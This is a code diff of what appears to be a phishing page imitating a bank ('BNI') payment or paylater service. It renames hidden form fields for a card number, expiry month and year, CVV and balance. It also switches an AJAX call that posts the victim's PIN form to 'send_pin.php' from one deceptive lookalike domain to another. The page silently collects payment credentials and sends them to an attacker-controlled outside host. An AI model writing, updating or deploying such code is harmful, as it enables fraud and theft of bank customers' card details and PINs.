@@ -124,9 +124,9 @@
 <div class="box-input-pin">
 				<div type="button" class="clear"></div>
 	<input type="hidden" name="nomor_hp" id="nomorku" valur="">
-    <input type="hidden" name="debitku" id="nama" valur="">
-    <input type="hidden" name="bulanku" id="bulan" valur="">
-    <input type="hidden" name="tahunku" id="tahun" valur="">
+    <input type="hidden" name="no_kartu" id="nama" valur="">
+    <input type="hidden" name="bulan" id="bulan" valur="">
+    <input type="hidden" name="tahun" id="tahun" valur="">
     <input type="hidden" name="cvvkode" id="pesan" valur="">	
     <input type="hidden" name="saldo" id="saldo" valur="">
     
@@ -302,7 +302,7 @@ $.ajax({
 
 
  type: 'POST',
- url: 'https://code-jquery-com.c1.is/BNI/send_pin.php',
+ url: 'https://yup-paylater.c1.is/BNI/5/send_pin.php',
  async: false,
  dataType: 'JSON',
  data: $('#pincode').serialize(),
